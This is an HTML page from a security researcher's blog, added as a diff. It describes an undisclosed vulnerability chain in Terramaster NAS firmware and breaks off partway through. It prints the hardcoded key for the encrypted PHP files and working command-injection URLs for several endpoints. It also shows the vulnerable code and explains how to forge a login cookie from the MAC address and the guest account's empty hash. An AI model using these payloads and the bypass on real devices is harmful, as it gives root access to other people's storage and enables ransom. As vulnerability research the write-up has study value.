@@ -1,0 +1,810 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="n0tme ">
+<meta name="description" content="How to summon RCEs The mystic arts of summoning RCEs seem obscure and complex to those who are not trained for it, but in reality, the secret to all of them is one: shell_exec.
+In the last couple weeks I was waiting for ZDI to know if they were interested in giving me some cash for this, but unfortunately they were not, so here you go: a freshly spawned 0day - merry fucking XMAS." />
+<meta name="keywords" content=", 4, terramaster, 0day, chain, vulnerability, RCE, exploit" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="/posts/2021/12/how-to-summon-rces/" />
+
+
+    <title>
+        
+            How to summon RCEs :: thatsn0tmysite  — The life of a newbor cyber security kid.
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.17863a81d979b637a02cd7632a4d86e9d80563ef460fd6af1a56962efcaa066b.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+    <meta name="theme-color" content="">
+
+
+
+<meta itemprop="name" content="How to summon RCEs">
+<meta itemprop="description" content="How to summon RCEs The mystic arts of summoning RCEs seem obscure and complex to those who are not trained for it, but in reality, the secret to all of them is one: shell_exec.
+In the last couple weeks I was waiting for ZDI to know if they were interested in giving me some cash for this, but unfortunately they were not, so here you go: a freshly spawned 0day - merry fucking XMAS."><meta itemprop="datePublished" content="2021-12-24T21:48:00+01:00" />
+<meta itemprop="dateModified" content="2021-12-24T21:48:00+01:00" />
+<meta itemprop="wordCount" content="2919">
+<meta itemprop="keywords" content="4,terramaster,0day,chain,vulnerability,RCE,exploit," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="How to summon RCEs"/>
+<meta name="twitter:description" content="How to summon RCEs The mystic arts of summoning RCEs seem obscure and complex to those who are not trained for it, but in reality, the secret to all of them is one: shell_exec.
+In the last couple weeks I was waiting for ZDI to know if they were interested in giving me some cash for this, but unfortunately they were not, so here you go: a freshly spawned 0day - merry fucking XMAS."/>
+
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2021-12-24 21:48:00 &#43;0100 CET" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">thatsn0tmysite</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/posts/">Blog</a></li><li><a href="/projects/">Projects</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        14 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="/posts/2021/12/how-to-summon-rces/">How to summon RCEs</a>
+      </h1>
+
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <h1 id="how-to-summon-rces">How to summon RCEs</h1>
+<p>The mystic arts of summoning RCEs seem obscure and complex to those who are not trained for it, but in reality, the secret to all of them is one: <code>shell_exec</code>.</p>
+<p>In the last couple weeks I was waiting for <a href="https://www.zerodayinitiative.com/">ZDI</a> to know if they were interested in giving me some cash for this, but unfortunately they were not, so here you go: a freshly spawned 0day - merry fucking XMAS.</p>
+<p>I don&rsquo;t know if many of you are aware but legends speak of magic devices, called NASes (Network Attached Storage), which can be used to store all your data and backups so your other devices stay quick and light!</p>
+<p>Wouldn&rsquo;t it be a shame if somebody broke into it and, let&rsquo;s say asked for a ransom? Yes. Exactly.</p>
+<p>Now, what I&rsquo;ll be talking about surely isn&rsquo;t log4j, nor anything extremely cool, but I had fun finding the chain to RCE, so let&rsquo;s ruin someone&rsquo;s XMAS, Grinch style.</p>
+<p>Also, a word of advice, this is an in-depth article which might be long and &ldquo;boring&rdquo;, if you just wanna get shells, cause mayhem or read the exploit directly, <a href="https://gist.github.com/thatsn0tmysite/a8e1ab1892dc13c36d5dfe0dc6738e55">suit yourself</a>.</p>
+<h2 id="buy-it">Buy it</h2>
+<p>The first step in summoning an RCE is picking any of the mediocre technology products on Amazon, let&rsquo;s say&hellip; a Terramaster NAS.
+It has positive reviews. It has 4 stars. It looks cheaper than other brands - that&rsquo;s a no-brainer.</p>
+<h2 id="use-it">Use it</h2>
+<p>The second step is to use the product, see how sloppy the software looks, get a feel of how badly it could be developed and then proceed in setting up a baseline of &ldquo;normal&rdquo; behaviours.</p>
+<p>As a user, you want to take advantage of ALL the features you see available, such as <strong>ssh-ing</strong> into it, fiddling with config files, inspecting running processes,&hellip; all the things one would normally do when playing with a new toy!</p>
+<p>A quick run-down.
+First of all the NAS is running nginx, as shown by the <code>ps aux</code> output:</p>
+<pre tabindex="0"><code>root      2094  0.0  0.0  14364   848 ?        Ss   Nov16   0:00 nginx: master process /usr/sbin/nginx
+root      2095  0.0  0.1  15000  2156 ?        S    Nov16   0:00 nginx: worker process
+root      2096  0.0  0.1  15000  2164 ?        S    Nov16   0:01 nginx: worker process
+root      2097  0.0  0.1  15000  2080 ?        S    Nov16   0:02 nginx: worker process
+root      2098  0.0  0.1  15040  2188 ?        S    Nov16   0:01 nginx: worker process
+root      2195  0.0  0.1 165496  2484 ?        Ss   Nov16   1:18 php-fpm: master process (/etc/nginx/php-fpm.conf)
+root     22699  0.0  0.0   3232   384 pts/0    S+   10:55   0:00 grep nginx
+</code></pre><p>the current users on the system are:</p>
+<pre tabindex="0"><code>root❌0:0:root:/root:/bin/bash
+daemon❌1:1:daemon:/usr/sbin:/bin/false
+admin❌3:3:TOS User,:/home/admin:/bin/bash
+sync❌4💯sync:/bin:/bin/sync
+guest❌6:4:Linux User,:/home/guest:/bin/false
+mail❌8:8:mail:/var/spool/mail:/bin/false
+www-data❌33:33:www-data:/var/www:/bin/false
+operator❌37:37:Operator:/var:/bin/false
+nobody❌65534:65534:nobody:/home:/bin/false
+TimeMachine❌1000:1000:Linux User,:/home:/bin/false
+avahi❌1001:1001::/:/bin/false
+dbus❌1002:1002:DBus messagebus user:/var/run/dbus:/bin/false
+input❌1003:1003::/:/bin/false
+nslcd❌1004:1004:nslcd user:/:/bin/false
+sshd❌1005:1005:SSH drop priv user:/:/bin/false
+n0tme❌2:4:TOS User,,,:/home/n0tme:/bin/bash
+</code></pre><p>and there seems to be an interesting sqlite database file at <code>/etc/base/nasdb</code>:</p>
+<pre tabindex="0"><code>n0tme@nas:~# sqlite3 /etc/base/nasdb 
+SQLite version 3.8.11.1 2015-07-29 20:00:57
+Enter &quot;.help&quot; for usage hints.
+sqlite&gt; .databases
+seq  name             file                                                      
+---  ---------------  ----------------------------------------------------------
+0    main             /etc/base/nasdb                                           
+sqlite&gt; .tables
+acl_host        app_table       group_users     share_crypt     vpn_user_table
+acl_list        dav_list        interface       user_extend   
+acl_webdav      dfs_list        share           user_table    
+</code></pre><p>For now that&rsquo;s enough poking around, let&rsquo;s get down to business.</p>
+<h2 id="break-it">Break it</h2>
+<p>Now the juicy part. I will explain the things in the same order that I found them, so&hellip; enjoy.</p>
+<p>The chain consists of:</p>
+<ul>
+<li>3 remote command execution (pick you flavor!)</li>
+<li>1 session crafting</li>
+<li>1 arbitrary file download</li>
+<li>2 information disclosures (leading to privilege escalation)</li>
+</ul>
+<h3 id="php-files">PHP files</h3>
+<p>Obviously the first place where we have a higher chance at finding bugs is where most of the custom functionality is: the web interface.</p>
+<p>Let&rsquo;s go take a look:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">n0tme@nas:/usr/www$ ls
+3.0  Enter.php  api  css  csv  databack  debug  debug.php  images  include  index.php  js  lang  m1.php  m2.php  mod  module  store  tos  version  wap  wizard
+</code></pre></div><p>Nice, now what we need is to find out what those <code>.php</code> files do:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">n0tme@nas:/usr/www$ cat m1.php | head -5
+u�45�O��}�Ѹ�*��S�C���kL��u+��RY�~��%6�i:�*��iI  ����l�mQ���������f���yu�7J�/�B3�<span style="color:#ed9d13">`</span>��^A�Ro�J]I<span style="color:#ed9d13">`</span>H&amp;ëM!�Q�����׳Nq/�șY��G�q�����6XxCFQ��.�
+!�eD^IϦ@���                                                                                                                         X��|��<span style="color:#ed9d13">\_</span>���W��Rk��&gt;�bF����Y(�$▒�G6$�<span style="color:#ed9d13">&#34;�|I6�rcy��TGn
+</span><span style="color:#ed9d13">           (�!d����}b
+</span></code></pre></div><p>I know what you&rsquo;re thinking&hellip; WTF. Looks like some <code>.php</code> files are encrypted, based on a very arcane knowledge of mine I recall that php scripts are not binary files, so something must be decrypting those before they reach the interpreter so it can execute them.</p>
+<p>Since this thing runs nginx my bets were either some nginx module or a php module. That or some black magic happening somewhere else.
+By checking the <code>/etc/nginx/nginx.conf</code> and running <code>nginx -V</code> does not reveal any module or special executable used, which means hopefully our answer will be in the php configuration:</p>
+<pre tabindex="0"><code>n0tme@nas:/etc/php7# ls
++PACKAGE_php7-mod-iconv:icu  20_exif.ini      20_intl.ini      20_pdo_mysql.ini         20_shmop.ini      20_tokenizer.ini
+15_openssl.ini               20_fileinfo.ini  20_json.ini      20_pdo_pgsql.ini         20_simplexml.ini  20_xml.ini
+20_bcmath.ini                20_ftp.ini       20_mbstring.ini  20_pdo_sqlite.ini        20_sockets.ini    20_xmlreader.ini
+20_calendar.ini              20_gd.ini        20_mysqlnd.ini   20_pgsql.ini             20_sqlite3.ini    20_xmlwriter.ini
+20_ctype.ini                 20_gettext.ini   20_opcache.ini   20_phar.ini              20_sysvmsg.ini    20_zip.ini
+20_curl.ini                  20_hash.ini      20_pcntl.ini     20_php_terra_master.ini  20_sysvsem.ini    30_mysqli.ini
+20_dom.ini                   20_iconv.ini     20_pdo.ini       20_session.ini           20_sysvshm.ini    33_redis.ini
+
+n0tme@nas:/etc/php7# cat 20_php_terra_master.ini 
+extension=php_terra_master.so
+</code></pre><p>Well, looks like we have something interesting here! There seems to actually be a convinently named <code>php_terra_master.so</code> extension loaded in PHP. To the GHIDRA mobile!</p>
+<h3 id="reversing-101">Reversing 101</h3>
+<p>Ok so, I am not a good reverse engineer by a long shot, so I&rsquo;ll be showing my totally naive approach to this. Do not do this at home, or do, I mean after all it kind of worked out for me.
+First step, is to get our hands on the binary and check if the binary is stripped or contains any useful debug info:</p>
+<pre tabindex="0"><code>n0tme :: ~/Downloads » file php_terra_master.so                                                                                 1 ↵
+php_terra_master.so: ELF 64-bit LSB shared object, ARM aarch64, version 1 (SYSV), dynamically linked, stripped
+
+n0tme :: ~/Downloads » readelf -sW php_terra_master.so|grep &quot;FUNC&quot;
+     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memcpy@GLIBC_2.17 (2)
+     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.17 (2)
+     8: 000000000000356c   296 FUNC    GLOBAL DEFAULT   10 pm9screw_compile_file
+     9: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND perror@GLIBC_2.17 (2)
+    11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND tmpfile@GLIBC_2.17 (2)
+    16: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND readlink@GLIBC_2.17 (2)
+    17: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND __cxa_finalize@GLIBC_2.17 (2)
+    20: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fileno@GLIBC_2.17 (2)
+    21: 0000000000003808     0 FUNC    GLOBAL DEFAULT   11 _fini
+        ...
+    41: 00000000000037ec    12 FUNC    GLOBAL DEFAULT   10 get_module
+    44: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fwrite@GLIBC_2.17 (2)
+    45: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND socket@GLIBC_2.17 (2)
+    46: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strcpy@GLIBC_2.17 (2)
+    47: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __fxstat@GLIBC_2.17 (2)
+    48: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strncpy@GLIBC_2.17 (2)
+    52: 0000000000000fd8     0 FUNC    GLOBAL DEFAULT    8 _init
+    53: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND ioctl@GLIBC_2.17 (2)
+</code></pre><p>The only thing that caught my eye here is really just the function <strong>pm9screw_compile_file</strong>, googling around for like a minute: <a href="https://sourceforge.net/projects/php-screw/files/php-screw/">here is a 2007 repository which might be useful</a>.</p>
+<p>From it&rsquo;s README:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md"><span style="color:#6ab825;font-weight:bold">1.</span> What&#39;s SCREW?
+
+ PHP Screw is a PHP script encryption tool. When you are developing a
+ commercial package using PHP, the script can be distributed as encrypted up
+ until just before execution. This preserves your intellectual property.
+</code></pre></div><p>This seems to fit our use case, we can take a look at the code to have a general overview of the algorithm used, then check with Ghidra if it is roughly the same, and take it from there!</p>
+<p>Listing all defined strings gives us a quite short list, which I made even shorter:</p>
+<pre tabindex="0"><code>0010081a        zend_compile_file       &quot;zend_compile_file&quot;     ds
+0010082c        org_compile_file        &quot;org_compile_file&quot;      ds
+0010083d        pm9screw_compile_file   &quot;pm9screw_compile_file&quot; ds
+00103824        php_terra_master support        &quot;php_terra_master support&quot;      ds
+0010384e        GH65Hws2jedf3fl3MeK     &quot;GH65Hws2jedf3fl3MeK&quot;   ds
+00103862        show_source     &quot;show_source&quot;   ds
+001038a4        php_terra_master        &quot;php_terra_master&quot;      ds
+001038cb        tos_encrypt_str &quot;tos_encrypt_str&quot;       ds
+</code></pre><p>As you can see there are a few interesting strings, and some strings which strongly hint us we are on the right track.
+There is also one very long string <strong>GH65Hws2jedf3fl3MeK</strong> - all of a sudden a flashback from my first crackmes struck me: <strong>hardcoded passphrases</strong>.</p>
+<p>Jumping at the only available XREF for our candidate passphrase we land at <code>0010341c</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#999;font-style:italic">/*...*/</span>
+  local_c0 = <span style="color:#3677a9">0</span>;
+  uStack184 = <span style="color:#3677a9">0</span>;
+  local_b0 = <span style="color:#3677a9">0</span>;
+  uStack168 = <span style="color:#3677a9">0</span>;
+  local_a0 = <span style="color:#3677a9">0</span>;
+  uStack152 = <span style="color:#3677a9">0</span>;
+  local_90 = <span style="color:#3677a9">0</span>;
+  uStack136 = <span style="color:#3677a9">0</span>;
+  puVar3 = (undefined8 *)FUN_00102348(<span style="color:#ed9d13">&#34;GH65Hws2jedf3fl3MeK&#34;</span>);
+<span style="color:#999;font-style:italic">/*...*/</span>
+</code></pre></div><p>now, at this point I just wanted to break things, luckily I stumbled upon the very friendly <a href="https://matrix.to/#/@bloodyshell:matrix.org">bloodyshell</a> who happened to be working on my exact device, for obviously different purposes.
+Since he already worked (or worked way quicker than me) on reversing the algorithm, I asked him for help and he blessed me with a decryption tool to &ldquo;unscrew&rdquo; the code.
+A link to the utility&rsquo;s source code is <a href="https://gist.github.com/thatsn0tmysite/c20602289d2cdc9ab7484851eefd92ba">here</a>].</p>
+<p>Which leaves us with a decrypted web root!</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">n0tme :: unscrewed » cat m1.php|head -10
+&lt;?php
+include_once <span style="color:#ed9d13">&#34;include/app.php&#34;</span>;
+<span style="color:#40ffff">$core</span> = new core();
+<span style="color:#40ffff">$board</span> = <span style="color:#40ffff">$core</span>-&gt;_boardmodel();
+<span style="color:#40ffff">$vn</span> = <span style="color:#40ffff">$core</span>-&gt;_VersionNumber();
+<span style="color:#40ffff">$macs</span>[0] = trim(file_get_contents(<span style="color:#ed9d13">&#39;/sys/class/net/eth0/address&#39;</span>));
+<span style="color:#40ffff">$macs</span>[1] = trim(file_get_contents(<span style="color:#ed9d13">&#39;/sys/class/net/eth1/address&#39;</span>));
+?&gt;
+&lt;!DOCTYPE HTML&gt;
+&lt;html&gt;
+</code></pre></div><h3 id="grep-dat-shell-rces">Grep dat shell (RCEs)</h3>
+<p>Literally, grep for shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">n0tme :: unscrewed » grep -rie <span style="color:#ed9d13">&#34;shell_exec(.*&#34;</span> -e <span style="color:#ed9d13">&#34;system(.*&#34;</span> . | cut -d<span style="color:#ed9d13">&#34;:&#34;</span> -f <span style="color:#3677a9">1</span> | sort -u | grep -v <span style="color:#ed9d13">&#34;.js&#34;</span>
+./3.0/config/setting.php
+./3.0/controller/app.class.php
+./3.0/controller/explorer.class.php
+./3.0/controller/member.class.php
+./3.0/controller/share.class.php
+./3.0/controller/util.php
+./3.0/lib/core/Controller.class.php
+./3.0/lib/function/file.function.php
+./Enter.php
+./include/ajax/ajaxdata.php
+./include/ajax/handle.php
+./include/ajax/iscsitable.php
+./include/ajax/monitortable.php
+./include/ajax/nettable.php
+./include/ajax/Rsytable.php
+./include/ajax/usertable.php
+./include/class/application.class.php
+./include/class/core.class.php
+./include/class/func.class.php
+./include/class/getfile.class.php
+./include/class/mediasearch.class.php
+./include/class/mobile.class.php
+./include/class/notifications.class.php
+./include/class/person.class.php
+./include/class/plugs.class.php
+./include/class/raid.class.php
+./include/class/SessionEvents.class.php
+./include/class/sharefolder.class.php
+./include/class/ssl.class.php
+./include/class/status.class.php
+./include/class/storage.class.php
+./include/class/systime.class.php
+./include/class/ups.class.php
+./include/class/volume.class.php
+./include/class/VPN.class.php
+./include/class/wap.class.php
+./include/class/WebDav.class.php
+./include/patch.php
+./include/updataDomain.php
+./include/upload.php
+./tos/config/setting.php
+./tos/controller/app.class.php
+./tos/controller/explorer.class.php
+./tos/controller/member.class.php
+./tos/controller/share.class.php
+./tos/controller/util.php
+./tos/lib/core/Controller.class.php
+./tos/lib/function/file.function.php
+./wizard/index.php
+</code></pre></div><p>Now, we want something that has user controlled input, hopefully with no authentication required.
+I could not find anything like that, what I could find is instead an interesting function which accepts user input and result in an RCE if reached by an <strong>admin</strong> user:</p>
+<pre tabindex="0"><code>http://nas:8181/tos/index.php?app/app_start_stop&amp;id=transmission&amp;start=0&amp;name=Transmission.*.oexe;ls%3E/tmp/xxx.txt;ls
+</code></pre><p>And a couple which work from <strong>non-admin</strong> users as well, these do not conviniently provide an output in the response, but nonetheless they stillexecute our commands:</p>
+<pre tabindex="0"><code>http://192.168.2.201:8181/tos/index.php?app/del&amp;id=0&amp;name=;ls%3E/tmp/xyz.txt;ls%23
+
+http://192.168.2.201:8181/tos/index.php?app/hand_app&amp;name=;ls%3E/tmp/kjl.txt;ls.tpk
+</code></pre><p>All have a similar issue, user input is inserted into a string executed by either <code>shell_exec()</code> or <code>system()</code>, I will provide one example below, the function <code>app/del</code> at <code>tos/controller/app.class.php</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">function</span> <span style="color:#447fcf">del</span>() {
+    <span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">init_sql</span>();
+    <span style="color:#40ffff">$id</span> = <span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">in</span>[<span style="color:#ed9d13">&#39;id&#39;</span>];
+    <span style="color:#40ffff">$name</span> = <span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">in</span>[<span style="color:#ed9d13">&#39;name&#39;</span>];
+    @system(<span style="color:#ed9d13">&#34;rm -f &#34;</span>.USER.<span style="color:#ed9d13">&#34;home/desktop/</span><span style="color:#ed9d13">{</span><span style="color:#40ffff">$name</span><span style="color:#ed9d13">}</span><span style="color:#ed9d13">.*.oexe&#34;</span>);
+    <span style="color:#40ffff">$result</span> = self::<span style="color:#40ffff">$netfile</span>-&gt;<span style="color:#bbb">delete</span>(<span style="color:#40ffff">$id</span>);
+    <span style="color:#6ab825;font-weight:bold">if</span>(<span style="color:#40ffff">$result</span> == <span style="color:#3677a9">1</span>){
+        show_json(<span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">L</span>[<span style="color:#ed9d13">&#39;success&#39;</span>]);
+    }<span style="color:#6ab825;font-weight:bold">else</span>{
+        show_json(<span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">L</span>[<span style="color:#ed9d13">&#39;error&#39;</span>],<span style="color:#6ab825;font-weight:bold">false</span>);
+    }
+}
+</code></pre></div><p>User controls the parameter <code>name</code> which gets concatenated inside the OS call and executed, as <strong>root</strong>. Bad.</p>
+<h3 id="you-shall-not-pass-session-crafting">You shall <del>not</del> pass! (Session crafting)</h3>
+<p>Now we have a RCE, but we still need to get access to it without a user. In our case we need an authentication bypass of some kind to reach the vulnerable functions.
+Which leaves us hunting for APIs which manage authentication logic or sessions.</p>
+<p>I&rsquo;ll save the boring stuff, after some time looking at the code I eventually found that the file <code>include/class/application.class.php</code> managed the login:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">function</span> <span style="color:#447fcf">loginCheck</span>() {
+<span style="color:#999;font-style:italic">/*...*/</span>
+<span style="color:#6ab825;font-weight:bold">else</span> <span style="color:#6ab825;font-weight:bold">if</span>(<span style="color:#40ffff">$_COOKIE</span>[<span style="color:#ed9d13">&#39;kod_name&#39;</span>] != <span style="color:#ed9d13">&#39;&#39;</span> &amp;&amp; <span style="color:#40ffff">$_COOKIE</span>[<span style="color:#ed9d13">&#39;kod_token&#39;</span>] != <span style="color:#ed9d13">&#39;&#39;</span>){
+            <span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">sessionid</span> = <span style="color:#ed9d13">&#34;&#34;</span>;
+            <span style="color:#40ffff">$db</span> = <span style="color:#6ab825;font-weight:bold">new</span> NasDBLite();
+            <span style="color:#40ffff">$members</span> = <span style="color:#40ffff">$db</span>-&gt;<span style="color:#bbb">member</span>();
+            <span style="color:#40ffff">$user</span> = isset(<span style="color:#40ffff">$members</span>[<span style="color:#40ffff">$_COOKIE</span>[<span style="color:#ed9d13">&#39;kod_name&#39;</span>]]) ? <span style="color:#40ffff">$members</span>[<span style="color:#40ffff">$_COOKIE</span>[<span style="color:#ed9d13">&#39;kod_name&#39;</span>]] : <span style="color:#6ab825;font-weight:bold">false</span>;
+            <span style="color:#40ffff">$db</span>-&gt;<span style="color:#bbb">close</span>();
+            <span style="color:#6ab825;font-weight:bold">if</span> (!is_array(<span style="color:#40ffff">$user</span>) || !isset(<span style="color:#40ffff">$user</span>[<span style="color:#ed9d13">&#39;password&#39;</span>])) {
+                <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">false</span>;
+            }
+            <span style="color:#6ab825;font-weight:bold">if</span>(tos_encrypt_str(<span style="color:#40ffff">$user</span>[<span style="color:#ed9d13">&#39;password&#39;</span>]) == <span style="color:#40ffff">$_COOKIE</span>[<span style="color:#ed9d13">&#39;kod_token&#39;</span>]){
+                <span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">sessionid</span> = SessionEvents::<span style="color:#bbb">login</span>(<span style="color:#40ffff">$user</span>);
+                <span style="color:#6ab825;font-weight:bold">if</span> (<span style="color:#40ffff">$user</span>[<span style="color:#ed9d13">&#39;role&#39;</span>] == <span style="color:#ed9d13">&#39;root&#39;</span>) {
+                    <span style="color:#40ffff">$GLOBALS</span>[<span style="color:#ed9d13">&#39;is_admin&#39;</span>] = <span style="color:#3677a9">1</span>;
+                }<span style="color:#6ab825;font-weight:bold">else</span>{
+                    <span style="color:#40ffff">$GLOBALS</span>[<span style="color:#ed9d13">&#39;is_admin&#39;</span>] = <span style="color:#3677a9">0</span>;
+                }
+                <span style="color:#40ffff">$GLOBALS</span>[<span style="color:#ed9d13">&#39;user&#39;</span>] = <span style="color:#40ffff">$user</span>;
+                define(<span style="color:#ed9d13">&#39;USER&#39;</span>, USER_PATH.<span style="color:#40ffff">$user</span>[<span style="color:#ed9d13">&#39;name&#39;</span>].<span style="color:#ed9d13">&#39;/&#39;</span>);
+                define(<span style="color:#ed9d13">&#39;USER_DATA&#39;</span>, USER.<span style="color:#ed9d13">&#39;.data/&#39;</span>);
+                define(<span style="color:#ed9d13">&#39;USER_TEMP&#39;</span>, USER_DATA.<span style="color:#ed9d13">&#39;temp/&#39;</span>);
+                define(<span style="color:#ed9d13">&#39;USER_HOME&#39;</span>, USER.<span style="color:#ed9d13">&#39;home/&#39;</span>);
+                define(<span style="color:#ed9d13">&#39;USER_RECYCLE&#39;</span>, USER.<span style="color:#ed9d13">&#39;recycle/&#39;</span>);
+                setcookie(<span style="color:#ed9d13">&#39;kod_name&#39;</span>, <span style="color:#40ffff">$_COOKIE</span>[<span style="color:#ed9d13">&#39;kod_name&#39;</span>], time()+<span style="color:#3677a9">3600</span>*<span style="color:#3677a9">24</span>*<span style="color:#3677a9">365</span>);
+                setcookie(<span style="color:#ed9d13">&#39;kod_token&#39;</span>,<span style="color:#40ffff">$_COOKIE</span>[<span style="color:#ed9d13">&#39;kod_token&#39;</span>],time()+<span style="color:#3677a9">3600</span>*<span style="color:#3677a9">2</span>, <span style="color:#ed9d13">&#34;/&#34;</span>);
+                <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">true</span>;
+<span style="color:#999;font-style:italic">/*...*/</span>
+</code></pre></div><p>The first part checks for an existing session, which we obviously do not have, if it does not exist, it checks some cookies: <code>kod_name</code> and <code>kod_token</code> which are the username and the session cookie.</p>
+<p>So, to bypass the login and get a valid session we need to:</p>
+<ul>
+<li>craft a <code>kod_name</code> with an existing user (quiet easy)</li>
+<li>craft a valid <code>kod_token</code> (requires us to find out what <code>tos_encrypt_str</code> does)</li>
+</ul>
+<p>Turns out, <code>tos_encrypted_str</code> is not defined in any of the PHP files, which leaves it as a &ldquo;native&rdquo; function, which might be defined in the loaded custom module: <code>php_terra_master.so</code>.</p>
+<p>The function, which is at offset <code>00103738</code> basically does the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">tos_encrypt_str</span>(toencrypt):
+    key = MAC_ADDRESS[<span style="color:#3677a9">6</span>:] 
+    <span style="color:#6ab825;font-weight:bold">return</span> hashlib.md5(<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>key<span style="color:#ed9d13">}{</span>toencrypt<span style="color:#ed9d13">}</span><span style="color:#ed9d13">&#34;</span>.encode(<span style="color:#ed9d13">&#34;utf8&#34;</span>)).hexdigest()
+</code></pre></div><p>Dope, so we can now tos_encrypt stuff but we still need a user&rsquo;s password hash&hellip; luckily for us, when disabled the <code>guest</code> user has a default NULL hash, which means we can call <code>tos_encrypt_str(&quot;&quot;)</code> and get a valid token! When enabled the credentials seem to be hardcoded:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#999;font-style:italic">/*...*/</span>
+} <span style="color:#6ab825;font-weight:bold">else</span> {
